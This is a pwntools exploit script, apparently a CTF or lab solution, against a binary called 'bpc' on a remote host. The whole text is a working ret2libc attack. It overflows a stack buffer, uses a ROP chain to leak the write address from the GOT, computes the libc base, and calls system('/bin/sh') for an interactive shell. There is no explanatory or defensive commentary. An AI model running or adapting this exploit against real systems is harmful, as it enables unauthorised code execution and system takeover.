from pwn import *
context.log_level="DEBUG"
elf=ELF("./bpc")
# re=process("./bpc")
re=remote("10.131.1.19",60003)
libc=ELF("./libc-2.23.so")
re.recv()

# ROPgadget
#0x0000000000400601  pop rsi ; pop r15 ; ret

#leak address:
write_got=elf.got["write"]

rop_address=0x0000000000400601
ret_address=0x0000000000400578
rbp_address=0x0000000000601d00
payload="a"*(16)+p64(rbp_address)+p64(rop_address)+p64(write_got)+p64(1)+p64(ret_address)
re.sendline(payload)
write_address=u64(re.recv()[:8])
log.debug("%#x=>%#x"%(write_got,write_address))


base=write_address-libc.symbols["write"]
system_address=libc.symbols["system"]+base
bash_address=next(libc.search("/bin/sh"))+base

# ROPgadget
# 0x0000000000400603 : pop rdi ; ret
rop_address=0x0000000000400603
payload="a"*(16)+p64(0)+p64(rop_address)+p64(bash_address)+p64(system_address)

re.sendline(payload)
re.interactive()
